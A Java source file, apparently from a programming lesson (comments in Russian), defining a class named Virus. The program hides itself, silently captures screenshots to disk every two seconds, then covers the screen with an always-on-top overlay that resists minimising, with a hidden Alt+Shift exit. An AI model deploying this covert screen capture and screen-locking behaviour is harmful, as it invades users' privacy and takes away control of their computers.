package lesson13.testRobot;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.File;
import java.io.IOException;

public class Virus extends JFrame {
    Robot robot;
    Timer timer;
    int countScreens;
    Frame frame; // окно блокировщик
    Virus() throws AWTException {
        robot = new Robot();
        timer = new Timer(2000, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                try {
                    saveScreen();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        });
        timer.start();
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setVisible(true);
        setVisible(false);
    }

    private void saveScreen() throws IOException {
        countScreens++;
        Dimension dimension =  Toolkit.getDefaultToolkit().getScreenSize();
        var screen = robot.createScreenCapture(new Rectangle(0,0, dimension.width, dimension.height));
        ImageIO.write(screen,"PNG",new File("/home/medved/test/tmp/img+" + countScreens + ".png"));
        if(countScreens == 5){
            timer.stop();
            frame = new Frame();
            frame.setBounds(0,0,dimension.width,dimension.height);
            frame.setResizable(false);
            frame.setUndecorated(true);//убрали все кнопки
            frame.setAlwaysOnTop(true);//чтобы окно перекрывало любые окна
            frame.setBackground(Color.MAGENTA);
            frame.setOpacity(0.5f);
            frame.addWindowListener(new WindowAdapter() {
                @Override
                public void windowIconified(WindowEvent e) {
                    frame.setExtendedState(frame.MAXIMIZED_BOTH);
                }
            });
            frame.setVisible(true);
            timer = new Timer(10, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent actionEvent) {
                    frame.toFront(); // чтобы окно было поверх всех окон
                }
            });
            timer.start();
            KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher((KeyEventDispatcher) new KeyDispatcher());
        }

    }

    public static void main(String[] args) throws AWTException {
        new Virus();
    }
    class KeyDispatcher implements KeyEventDispatcher{

        @Override
        public boolean dispatchKeyEvent(KeyEvent keyEvent) {
            if (keyEvent.getKeyCode() == KeyEvent.VK_SHIFT && keyEvent.isAltDown()) {
                System.exit(0);
            }
            return false;
        }
    }
}
